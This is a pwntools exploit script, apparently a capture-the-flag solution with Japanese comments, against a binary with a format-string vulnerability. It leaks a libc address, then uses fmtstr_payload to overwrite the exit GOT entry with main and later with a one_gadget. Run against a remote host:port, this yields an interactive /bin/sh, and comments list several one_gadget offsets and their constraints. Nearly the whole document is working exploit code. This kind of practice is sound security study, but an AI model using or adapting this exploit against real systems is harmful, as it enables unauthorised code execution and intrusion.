from pwn import *
import subprocess
import threading
import time
import re

container_name = args.CONTAINER

context.log_level = "debug"
elf = context.binary = ELF(args.EXE or 'vuln')
if args.LIBC == "True":
    libc = ELF('libc.so.6')
elif isinstance(args.LIBC, str) and args.LIBC != "":
    libc = ELF(args.LIBC)
else:
    libc = 0
log.info(f"libc = {libc.path if libc else 'not loaded'}")


# エイリアス
# convのところはもし引数がstr型であればbyte型に、intやfloat型であればstr型に直してからbyte型に直してくれる
# e.g. ru("Choice: ") b"〜"で指定してもよい
# e.g. sl(1) str型にしてからbyte型に変換される
conv = lambda *x: tuple(
    str(y).encode() if isinstance(y, (int, float)) else
    y.encode() if isinstance(y, str) else
    y if isinstance(y, bytes) else
    (_ for _ in ()).throw(TypeError(f"Unsupported type: {type(y)}"))  # raise TypeError
    for y in x
)
rc  = lambda *x, **y: p.recv(*conv(*x), **y)
ru  = lambda *x, **y: p.recvuntil(*conv(*x), **y)
rl  = lambda *x, **y: p.recvline(*conv(*x), **y)
rrp = lambda *x, **y: p.recvrepeat(*conv(*x), **y)
ral = lambda *x, **y: p.recvall(*conv(*x), **y)
sn  = lambda *x, **y: p.send(*conv(*x), **y)
sl  = lambda *x, **y: p.sendline(*conv(*x), **y)
sa  = lambda *x, **y: p.sendafter(*conv(*x), **y)
sla = lambda *x, **y: p.sendlineafter(*conv(*x), **y)

# e.g. start(argv=[1])とすれば、./{binary} 1 を実行したことになる
# e.g. start(argv=[1], env={'DEBUG': '1'}, cwd='/tmp')とすれば環境変数等も指定できる
def start(argv=[], *a, **kw):
    # アーキテクチャの指定(何も指定しなければx64)
    if args.X32:
        context.arch = "i386"
        log.info("set i386")
    else:
        context.arch = "amd64"
        log.info("set amd64")

    # tmuxを使用する場合はTMUXを指定
    if args.TMUX:
        context.terminal  = ['tmux', 'split-window', '-h']

    # 実行方法の指定
    if args.REMOTE:
        # REMOTE=host:portの形で指定
        (host, port) = args.REMOTE.split(':')
        return connect(host, port)
    elif args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
b *main+396
continue
'''.format(**locals())

def padu64(b):
    while len(b) < 8:
        b = b + b"\x00"
    return u64(b)

def show_addr(addr,name="libc_base"):
    print("------------------------------")
    log.info(f"{name} = {addr:#018x}")
    print("------------------------------")

def menu(num):
    ru("Enter command: ")
    sl(num)

def create(index,name):
    menu(1)
    ru("Enter index: ")
    sl(index)
    ru("Enter file name: ")
    sl(name)

def copy(sindex,dindex):
    menu(2)
    ru("Enter source index: ")
    sl(sindex)
    ru("Enter destination index: ")
    sl(dindex)

def show(index):
    menu(3)
    ru("Enter index: ")
    sl(index)

def get_target_pid(container_name):
    try:
        result = subprocess.check_output(['sudo', 'docker', 'top', container_name], text=True)
    except subprocess.CalledProcessError as e:
        log.error("docker top failed: %s" % e)
        return None

    lines = result.strip().split('\n')
    for line in lines:
        if '/app/run' in line:
            parts = re.split(r'\s+', line)
            pid = parts[1]
            log.info(f"Found target PID: {pid}")
            return pid

    return None

def gdb_attach_when_pid_appears(container_name, max_tries=10, delay=0.2):
    for _ in range(max_tries):
        pid = get_target_pid(container_name)
        if pid:
            log.info(f"Attaching to PID {pid}")
            gdb.attach(int(pid), exe=args.EXE, gdbscript=gdbscript)
            return
        time.sleep(delay)
    log.warning("Failed to find PID for /app/run after several tries.")

p = start()
#threading.Thread(target=gdb_attach_when_pid_appears, args=(container_name,), daemon=True).start()
#time.sleep(3)

# phase1 libc leaks
ru("(^・ω・^§)ﾉ ".encode())
writes = {
    elf.got["exit"] : elf.symbols["main"]+356
}
payload = fmtstr_payload(7, writes, numbwritten=17, write_size='int')
sl(b"%41$paaa" + payload)
libc.address = int(rc(14),16) - 0x2a1ca
show_addr(libc.address)

one_gadget = libc.address + 0x1111da
# phase2 call system
pause()
writes = {
    elf.got["exit"] : one_gadget
}
payload = fmtstr_payload(7, writes, write_size='short')
sl(payload)


p.interactive()

# gefのone_gadgetはダメ(そもそも場所がだめだめ)で、ツールのonegadgetならいけた　なぜ？？？
# あとphase1のnumbwrittenの値の理由も謎
# 0x52dd4 posix_spawn(rdi, "/bin/sh", rdx, rcx, r8, environ)
# constraints:
#   rsp & 0xf == 0
#   [r8] == NULL
#   rdi == NULL || writable: rdi
#   rdx == NULL || (s32)[rdx+0x4] <= 0
#   rcx == NULL || (u16)[rcx] == NULL

# 0xfb062 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
# constraints:
#   [rsp+0x70] == NULL
#   [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
#   [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

# 0xfb06a posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r13)
# constraints:
#   [rsp+0x70] == NULL
#   [r13] == NULL || r13 == NULL
#   [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

# 0xfb06f posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r13)
# constraints:
#   [rsp+0x70] == NULL
#   [r13] == NULL || r13 == NULL
#   rdx == NULL || (s32)[rdx+0x4] <= 0

# 0xfb077 posix_spawn(rdi, "/bin/sh", rdx, 0, rsp+0x70, r9)
# constraints:
#   [rsp+0x70] == NULL
#   [r9] == NULL || r9 == NULL
#   rdi == NULL || writable: rdi
#   rdx == NULL || (s32)[rdx+0x4] <= 0

# 0xfb07e posix_spawn(rdi, "/bin/sh", rdx, rcx, r8, r9)
# constraints:
#   [r8] == NULL
#   [r9] == NULL || r9 == NULL
#   rdi == NULL || writable: rdi
#   rdx == NULL || (s32)[rdx+0x4] <= 0
#   rcx == NULL || (u16)[rcx] == NULL
